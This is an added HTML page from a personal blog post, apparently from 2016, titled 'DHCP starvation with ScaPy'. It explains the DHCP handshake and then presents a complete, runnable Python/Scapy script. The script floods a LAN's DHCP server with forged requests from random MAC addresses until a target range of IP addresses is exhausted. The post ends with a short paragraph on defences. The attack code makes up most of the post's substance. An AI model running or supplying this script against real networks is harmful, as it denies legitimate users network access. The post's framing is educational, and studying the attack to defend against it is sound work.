@@ -1,0 +1,701 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Network Security,ScaPy,DHCP," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="DHCPDHCP is a protocol helping assigning clients IP addresses in a Local Area Network (LAN). DHCP consists of 4 steps: DHCP discover, DHCP offer, DHCP request and DHCP ACK.
+
+DHCP discover is like clie">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DHCP starvation with ScaPy">
+<meta property="og:url" content="http://yoursite.com/2016/02/21/DHCP-starvation-with-ScaPy/index.html">
+<meta property="og:site_name" content="cabeggar">
+<meta property="og:description" content="DHCPDHCP is a protocol helping assigning clients IP addresses in a Local Area Network (LAN). DHCP consists of 4 steps: DHCP discover, DHCP offer, DHCP request and DHCP ACK.
+
+DHCP discover is like clie">
+<meta property="og:image" content="http://yoursite.com/images/dhcp_protocol.png">
+<meta property="og:updated_time" content="2016-03-06T23:50:04.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DHCP starvation with ScaPy">
+<meta name="twitter:description" content="DHCPDHCP is a protocol helping assigning clients IP addresses in a Local Area Network (LAN). DHCP consists of 4 steps: DHCP discover, DHCP offer, DHCP request and DHCP ACK.
+
+DHCP discover is like clie">
+<meta name="twitter:image" content="http://yoursite.com/images/dhcp_protocol.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/02/21/DHCP-starvation-with-ScaPy/"/>
+
+
+
+
+
+  <title> DHCP starvation with ScaPy | cabeggar </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-44445012-2', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">cabeggar</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <h1 class="site-subtitle" itemprop="description"></h1>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/02/21/DHCP-starvation-with-ScaPy/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="cabeggar">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="cabeggar">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="cabeggar" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                DHCP starvation with ScaPy
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-02-21T21:32:08+08:00">
+                2016-02-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/02/21/DHCP-starvation-with-ScaPy/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/02/21/DHCP-starvation-with-ScaPy/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h2><p>DHCP is a protocol helping assigning clients IP addresses in a Local Area Network (LAN). DHCP consists of 4 steps: DHCP discover, DHCP offer, DHCP request and DHCP ACK.</p>
+<p><img src="/images/dhcp_protocol.png" alt="DHCP protocol"></p>
+<p>DHCP discover is like client broadcasting in LAN finding a DHCP server (often located at the router) who can give it an IP address. DHCP offer is the server offering a possible IP, while DHCP request is the client broadcasting to all other clients and the server that it is going to take that IP. The last step often differs in different situations, ACK stands for a success DHCP process, while NAK means the required IP is already taken by someone else.</p>
+<p>However, this process is quite insecure, since we can establish a fake DHCP server since client use broadcast to find servers. Besides, we can also use different hardware addresses (MAC addresses. DHCP servers often store IP-to-MAC relationship) to ask for a lot of different IP addresses so that other clients can’t get an IP to get access to Internet, which is called DHCP starvation, kind of network attack.</p>
+<p>In this article, we will focus on attack with DHCP request, which is the 3rd step. After we send DHCP requests, the server will assign requested IP to us, which is very helpful when we want to attack certain range of IP addresses. Attacking with DHCP discovery is also possible.</p>
+<h2 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h2><p>We use ScaPy to help us practice DHCP starvation. <a href="http://www.secdev.org/projects/scapy/" target="_blank" rel="external">ScaPy</a> is a python library with networking and security features.</p>
+<p>We establish a class called DHCPStarvation, which maintains two lists, one for MAC addresses and one for IP addresses. We need to store MAC addresses since we don’t want to send duplicate requests with the same MAC addresses (this won’t work because server has cache, as mentioned). We store IP addresses so that we can learn which IP addresses we have occupied to measure whether we succeed on certain scope.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">DHCPStarvation</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="comment"># Generated MAC stored to avoid same MAC requesting for different IP</span></div><div class="line">        self.mac = [<span class="string">""</span>]</div><div class="line"></div><div class="line">        <span class="comment"># Requested IP stored to identify registered IP</span></div><div class="line">        self.ip = []</div></pre></td></tr></table></figure>
+<p>The method handle_dhcp is how we handle DHCP ACK packets. we first check whether the DHCP packet is an ACK packet and then mark the destination IP address (which is the address assigned to us) as successfully occupied.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_dhcp</span><span class="params">(self, pkt)</span>:</span></div><div class="line">    <span class="keyword">if</span> pkt[DHCP]:</div><div class="line">        <span class="comment"># if DHCP server reply ACK, the IP address requested is registered</span></div><div class="line">        <span class="comment"># 10.10.111.107 is IP for bt5, not to be starved</span></div><div class="line">        <span class="keyword">if</span> pkt[DHCP].options[<span class="number">0</span>][<span class="number">1</span>]==<span class="number">5</span> <span class="keyword">and</span> pkt[IP].dst != <span class="string">"10.10.111.107"</span>:</div><div class="line">            self.ip.append(pkt[IP].dst)</div><div class="line">            <span class="keyword">print</span> str(pkt[IP].dst)+<span class="string">" registered"</span></div><div class="line"></div><div class="line">        <span class="comment"># Duplicate ACK may happen due to packet loss</span></div><div class="line">        <span class="keyword">elif</span> pkt[DHCP].options[<span class="number">0</span>][<span class="number">1</span>]==<span class="number">6</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"NAK received"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listen</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="comment"># sniff DHCP packets</span></div><div class="line">    sniff(filter=<span class="string">"udp and (port 67 or port 68)"</span>,</div><div class="line">          prn=self.handle_dhcp,</div><div class="line">          store=<span class="number">0</span>)</div></pre></td></tr></table></figure>
+<p>The class’s start() method includes two parts. One is using a thread to keep listening DHCP packets. The other one keep starting the starve method until all targeted IPs are registered.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="comment"># start packet listening thread</span></div><div class="line">    thread = Thread(target=self.listen)</div><div class="line">    thread.start()</div><div class="line">    <span class="keyword">print</span> <span class="string">"Starting DHCP starvation..."</span></div><div class="line"></div><div class="line">    <span class="comment"># Keep starving until all 100 targets are registered</span></div><div class="line">    <span class="comment"># 100~200 excepts 107 = 100</span></div><div class="line">    <span class="keyword">while</span> len(self.ip) &lt; <span class="number">100</span>: self.starve()</div><div class="line">    <span class="keyword">print</span> <span class="string">"Targeted IP address starved"</span></div></pre></td></tr></table></figure>
+<p>The starve method send DHCP requests for certain IP in a loop. Everytime we try to generate a new MAC address and check whether current IP is already registered. We also use sleep to avoid congesting the link with DHCP, which will clearly decrease the efficiency of our attack.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">starve</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">101</span>):</div><div class="line">            <span class="comment"># don't request 10.10.111.107</span></div><div class="line">            <span class="keyword">if</span> i == <span class="number">7</span>: <span class="keyword">continue</span></div><div class="line"></div><div class="line">            <span class="comment"># generate IP we want to request</span></div><div class="line">            <span class="comment"># if IP already registered, then skip</span></div><div class="line">            requested_addr = <span class="string">"10.10.111."</span>+str(<span class="number">100</span>+i)</div><div class="line">            <span class="keyword">if</span> requested_addr <span class="keyword">in</span> self.ip:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            </div><div class="line">            <span class="comment"># generate MAC, avoid duplication</span></div><div class="line">            src_mac = <span class="string">""</span></div><div class="line">            <span class="keyword">while</span> src_mac <span class="keyword">in</span> self.mac:</div><div class="line">                src_mac = RandMAC()</div><div class="line">            self.mac.append(src_mac)</div><div class="line"></div><div class="line">            <span class="comment"># generate DHCP request packet</span></div><div class="line">            pkt = Ether(src=src_mac, dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>)</div><div class="line">            pkt /= IP(src=<span class="string">"0.0.0.0"</span>, dst=<span class="string">"255.255.255.255"</span>)</div><div class="line">            pkt /= UDP(sport=<span class="number">68</span>, dport=<span class="number">67</span>)</div><div class="line">            pkt /= BOOTP(chaddr=RandString(<span class="number">12</span>, <span class="string">"0123456789abcdef"</span>))</div><div class="line">            pkt /= DHCP(options=[(<span class="string">"message-type"</span>, <span class="string">"request"</span>),</div><div class="line">                                 (<span class="string">"requested_addr"</span>, requested_addr),</div><div class="line">                                 (<span class="string">"server_id"</span>, <span class="string">"10.10.111.1"</span>),</div><div class="line">                                 <span class="string">"end"</span>])</div><div class="line">            sendp(pkt)</div><div class="line">            <span class="keyword">print</span> <span class="string">"Trying to occupy "</span>+requested_addr</div><div class="line">            sleep(<span class="number">0.2</span>)  <span class="comment"># interval to avoid congestion and packet loss</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    starvation = DHCPStarvation()</div><div class="line">    starvation.start()</div></pre></td></tr></table></figure>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>As we can see, DHCP itself is a very fragile protocol which can be easily attacked and network disability can be easily caused. To avoid such attack, we can set limit for IP assigning on certain ports. Also we can try to identify abnormal DHCP discoveries or requests to react quickly to possible attack.</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Network-Security/" rel="tag"># Network Security</a>
+          
+            <a href="/tags/ScaPy/" rel="tag"># ScaPy</a>
+          
+            <a href="/tags/DHCP/" rel="tag"># DHCP</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/12/14/Software-Defined-Network-in-Data-Center-III-SDN-in-two-linear-topology/" rel="next" title="Software Defined Network in Data Center III - SDN in two-linear topology">
+                <i class="fa fa-chevron-left"></i> Software Defined Network in Data Center III - SDN in two-linear topology
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/03/06/Software-Defined-Network-in-Data-Center-IV-Conclusion-and-Other-Practice/" rel="prev" title="Software Defined Network in Data Center IV - Conclusion and Other Practice">
+                Software Defined Network in Data Center IV - Conclusion and Other Practice <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="cabeggar" />
+          <p class="site-author-name" itemprop="name">cabeggar</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DHCP"><span class="nav-number">1.</span> <span class="nav-text">DHCP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Scripts"><span class="nav-number">2.</span> <span class="nav-text">Scripts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">3.</span> <span class="nav-text">Conclusion</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cabeggar</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'cabloggar';
+      var disqus_identifier = '2016/02/21/DHCP-starvation-with-ScaPy/';
+
+      var disqus_title = "DHCP starvation with ScaPy";
+
+
+      function run_disqus_script(disqus_script) {
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+
+    </script>
+  
+
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
